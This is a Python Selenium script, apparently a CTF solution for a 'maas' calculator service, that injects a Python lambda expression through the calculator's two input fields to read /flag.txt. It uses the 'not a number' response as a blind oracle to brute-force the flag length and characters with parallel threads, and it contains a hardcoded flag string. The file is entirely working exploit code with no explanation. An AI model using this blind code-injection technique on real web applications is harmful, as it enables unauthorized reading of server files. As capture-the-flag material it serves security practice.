import threading
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.keys import Keys
import time
import string
import sys

TARGET_URL = 'https://maas.rars.win'

CURSOR_UP_ONE = '\033[F'
ERASE_LINE = '\033[K'


class FlagThread(threading.Thread):
    def __init__(self, threadID, name, n):
        threading.Thread.__init__(self)
        self.threadID = threadID
        self.name = name
        self.n = n
        self.ch = ""

    def run(self):
        self.ch = getFlagChar(self.n)


def getFlagChar(n):
    for i in string.printable:
        sys.stdout.write("Tesing: "+i+"\r")
        sys.stdout.flush()
        sys.stdout.write(ERASE_LINE)
        result=False
        while True:
            try:
                result = check_char(n, i)
                break
            except Exception:
                print('Oops - '+str(n))
        if result:
            print("Found "+str(n)+" = "+i)
            return i


def check_char(pos, ch):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    driver = webdriver.Chrome(options=chrome_options)
    payload = "(lambda a:0 if open('/flag.txt','r').read({})[-1]==a else 'a')('{}'".format(
        pos, ch)
    driver.get(TARGET_URL+'/calculator')
    time.sleep(2)
    driver.find_element_by_id('button-arithmetic').click()
    driver.find_element_by_name('n1').send_keys(payload)
    driver.find_element_by_name('n2').send_keys(')')
    driver.find_element_by_name('add').click()
    time.sleep(1)
    if driver.find_element_by_tag_name('pre').text != "    Result is not a number":
        driver.close()
        return True
    else:
        driver.close()
        return False


def getFlag(l):
    threads = list()
    for i in range(0, l):
        threads.append(FlagThread(i, "Flag_"+str(i), i+1))
        threads[i].start()

    result = ""
    for i in range(0, l):
        threads[i].join()
        result = result+threads[i].ch

    return result


def getFlagLength():
    i = 30
    while True:
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        driver = webdriver.Chrome(options=chrome_options)
        payload = "(lambda a:0 if len(open('/flag.txt','r').read())==a else 'a')({}".format(i)
        driver.get(TARGET_URL+'/calculator')
        time.sleep(1)
        driver.find_element_by_id('button-arithmetic').click()
        driver.find_element_by_name('n1').send_keys(payload)
        driver.find_element_by_name('n2').send_keys(')')
        driver.find_element_by_name('add').click()
        time.sleep(1)
        if driver.find_element_by_tag_name('pre').text != "    Result is not a number":
            driver.close()
            return i
        i+=1
        sys.stdout.write("Tesing: "+str(i)+"\r")
        sys.stdout.flush()
        sys.stdout.write(ERASE_LINE)


def getFlagSasta():
    flag = "rarctf{0v3rk1ll_4s_4_s3rv1c3_3fca0faa}"
    i = 10
    while True:
        for ch in string.printable:
            correct = check_char(i+1, ch)
            if correct:
                if ch == '}':
                    return flag+"}"

                flag = flag+ch
                break
            sys.stdout.write("Tesing: "+ch+"\r")
            sys.stdout.flush()
            sys.stdout.write(ERASE_LINE)
            i += 1
        print(flag)


#l=getFlagLength()
#print(l)
l=39
print(getFlag(l))
